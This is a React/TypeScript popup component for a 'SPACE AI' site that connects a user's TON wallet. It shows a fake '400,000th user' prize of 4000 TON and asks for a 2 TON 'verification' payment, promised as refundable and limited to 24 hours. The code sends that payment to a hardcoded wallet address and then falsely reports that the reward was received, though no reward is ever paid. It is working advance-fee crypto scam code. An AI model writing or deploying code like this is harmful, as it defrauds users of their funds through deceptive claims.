
import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Gift, Wallet, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useTonConnectUI } from '@tonconnect/ui-react';
import { sendTONPayment } from '@/utils/ton';

interface RewardPopupProps {
  isOpen: boolean;
  onClose: () => void;
  onNavigateToReferral?: () => void;
}

const RewardPopup: React.FC<RewardPopupProps> = ({ isOpen, onClose, onNavigateToReferral }) => {
  const { toast } = useToast();
  const [tonConnectUI] = useTonConnectUI();
  const [claimed, setClaimed] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const isWalletConnected = !!tonConnectUI.wallet;

  const handleConnectWallet = async () => {
    setIsConnecting(true);
    try {
      await tonConnectUI.openModal();
      toast({
        title: "Opening Connection",
        description: "Please select your wallet",
      });
    } catch (error) {
      console.error('Error connecting wallet:', error);
      toast({
        title: "Connection Error",
        description: "Failed to connect wallet",
        variant: "destructive"
      });
    } finally {
      setIsConnecting(false);
    }
  };

  const handlePayVerificationFee = async () => {
    if (!isWalletConnected) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      });
      return;
    }

    setIsProcessing(true);
    try {
      console.log('Sending 2 TON verification payment...');
      const result = await sendTONPayment(tonConnectUI, "UQBvI0aFLnw2QbZgjMPCLRdtRHxhUyinQudg6sdiohIwg5jL", 2);
      
      console.log('TON payment successful:', result);
      setClaimed(true);
      
      toast({
        title: "🎉 Payment Successful!",
        description: "Congratulations! You've received 4000 TON",
      });
      
    } catch (error) {
      console.error('Payment failed:', error);
      toast({
        title: "Payment Failed",
        description: "An error occurred during payment",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleClaim = () => {
    if (!isWalletConnected) {
      handleConnectWallet();
      return;
    }
    
    handlePayVerificationFee();
  };

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleCancel = () => {
    console.log('Cancel button clicked - closing popup');
    onClose();
  };

  useEffect(() => {
    const handleEscapeKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape' && isOpen) {
        onClose();
      }
    };

    if (isOpen) {
      document.addEventListener('keydown', handleEscapeKey);
    }

    return () => {
      document.removeEventListener('keydown', handleEscapeKey);
    };
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4" onClick={handleBackdropClick}>
      <div className="glass-button bg-black/90 backdrop-blur-xl border border-white/10 rounded-xl p-3 max-w-xs w-full shadow-2xl relative" onClick={(e) => e.stopPropagation()}>
        {/* Close button */}
        <button
          onClick={handleCancel}
          className="absolute top-1 right-1 text-white/70 hover:text-white transition-colors"
        >
          <X className="w-3 h-3" />
        </button>

        {/* Content */}
        <div className="text-center space-y-2">
          {/* Gift icon */}
          <div className="mx-auto w-8 h-8 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center shadow-lg">
            <Gift className="w-4 h-4 text-white" />
          </div>

          {/* Title */}
          <h2 className="text-sm font-bold text-white">Congratulations from SPACE AI!</h2>

          {/* Message */}
          <div className="text-white/90 text-xs leading-relaxed space-y-1">
            <p>You've just become our 400,000th registered user, and we're excited to reward you with a special bonus of <strong className="text-yellow-400">4000 TON</strong> as part of our celebration campaign!</p>
            
            <p>• To ensure the reward is sent to the correct and active account, a quick <strong>2 TON</strong> verification transaction is required.</p>
            
            <p><strong>Important:</strong> This is not a fee or charge. Once verified, the 2 TON will be instantly refunded to your wallet, along with your full 4000 TON reward.</p>
            
            <div className="glass-button bg-white/5 backdrop-blur-lg rounded-md p-1 border border-white/10">
              <p className="text-green-400 font-semibold text-xs">Total received = 4002 TON</p>
            </div>
            
            <p>• Your reward is reserved for the next 24 hours only, so please complete the verification in time to claim your bonus.</p>
            
            <p className="text-white/70 text-xs">Thank you for being part of the SPACE AI community. We're just getting started!</p>
          </div>

          {/* Action buttons */}
          <div className="pt-1">
            {!isWalletConnected ? (
              <Button
                onClick={handleConnectWallet}
                disabled={isConnecting}
                variant="glass-blue"
                className="w-full py-1.5 text-xs font-semibold h-auto"
                size="sm"
              >
                <Wallet className="w-3 h-3 mr-1" />
                {isConnecting ? 'Connecting...' : 'Connect Wallet'}
              </Button>
            ) : (
              <Button
                onClick={handleClaim}
                disabled={claimed || isProcessing}
                variant={claimed ? "glass-green" : "glass-cyan"}
                className="w-full py-1.5 text-xs font-semibold h-auto"
                size="sm"
              >
                <img 
                  src="/lovable-uploads/1e3f7a79-7f90-4605-90b2-fd779ee99f8f.png" 
                  alt="TON" 
                  className="w-3 h-3 mr-1" 
                />
                {isProcessing ? 'Processing...' : claimed ? '✓ Success!' : 'Claim Reward'}
              </Button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default RewardPopup;
